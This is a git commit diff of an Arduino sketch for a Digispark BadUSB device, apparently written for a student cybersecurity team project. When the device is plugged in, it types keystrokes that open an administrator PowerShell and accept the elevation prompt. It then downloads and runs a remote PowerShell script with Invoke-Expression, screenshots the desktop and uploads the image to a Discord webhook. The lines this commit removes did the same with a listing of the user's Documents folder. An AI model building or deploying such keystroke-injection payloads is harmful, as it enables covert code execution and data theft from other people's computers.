329c8abbcbbf0c6d24b3447311ffb5a801cea7b9
Marquito0077 <90941250+Marquito0077@users.noreply.github.com>
2024-01-25 17:43:41 -0400

    Only Takes a screenshot
    Alt+Tab is still broken, but executes the commands properly now

--- PowerShell_Exfiltration_BadUSB/PowerShell_Exfiltration_BadUSB.ino
+++ PowerShell_Exfiltration_BadUSB/PowerShell_Exfiltration_BadUSB.ino
@@ -16,56 +16,46 @@
   PS = PowerShell
 */
 
-void getUploadDiscordFunction() {
-  // downloads the Upload-Discord PS function from GitHub
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");
-}
+// Test Branch B - ONLY SCREENSHOT
 
-void enterPowerShell() {
-  // Accessing PowerShell
+void setup() {
+  DigiKeyboard.update();
+
+  // Accessing PowerShell with Win + X
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // opens the execute popup
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
+  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes")
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
-}
 
-void intoDocumentsFolder() {
-  // Accessing the Documents Folder
+  // brings focus to the PS window
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$pathDocs = [Environment]::GetFolderPath('MyDocuments')"); // gets the folder path
+  DigiKeyboard.println("$wshell = New-Object -ComObject wscript.shell");
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("cd $pathDocs"); // changes directory into that path
+  DigiKeyboard.println("$wshell.AppActivate('powershell')");
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("ls | Out-File -FilePath docsFolderContents.txt"); // lists the contents of the folder
-                                                                    // and outputs it on a text file in the same directory
+  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // Alt + Tab
 
+  // downloads the Upload-Discord PS function from GitHub
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println('Upload-Discord -file "docsFolderContents.txt" -text "CONTENTS OF USER DOCS FOLDER"'); // uploads the file to the Discord webhook
-
+  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("rm nothingToSee.txt"); // removes the log file after uploading to Discord
-}
+  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");
 
-void screenshotTheDesktop() {
   // Screenshots the computers Desktop (wallpaper)
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // minimizes all windows
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(70, MOD_GUI_LEFT); // uses the Print Screen key to take the screenshot
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // gets back to PS
+  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // gets back to PS with Alt + Tab
 
-  
   // Finds the screenshot in the MyPictures folder
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$pathPics = [Environment]::GetFolderPath('MyPictures')"); // gets the folder path
+  DigiKeyboard.println('$pathPics = [Environment]::GetFolderPath("MyPictures")'); // gets the folder path
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("$latestFile = gci Screenshots | sort LastWriteTime | select -last 1"); // gets the latest file written
   DigiKeyboard.delay(1000);
@@ -73,24 +63,13 @@ void screenshotTheDesktop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.println('Upload-Discord -file $latestFile.Name -text "DESKTOP WALLPAPER SCREENSHOT"');
   
-}
-
-void setup() {
-  DigiKeyboard.update();
-
-   enterPowerShell();
-   getUploadDiscordFunction();
-
-  // intoDocumentsFolder();
-
-  screenshotTheDesktop();
-  
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");  // closes the PowerShell window
 
-  // DEVELOPED BY MARCOS RODRIGUEZ (MIKE ROBLES) FOR TEAM ECHO
+  // DEVELOPED BY MARCOS RODRÍGUEZ NÚÑEZ (MIKE ROBLES) FOR TEAM ECHO
   // WATCHDOGS CYBERSECURITY - BADUSB PROJECT
   // JANUARY 2024
+
 }
 
 void loop() {
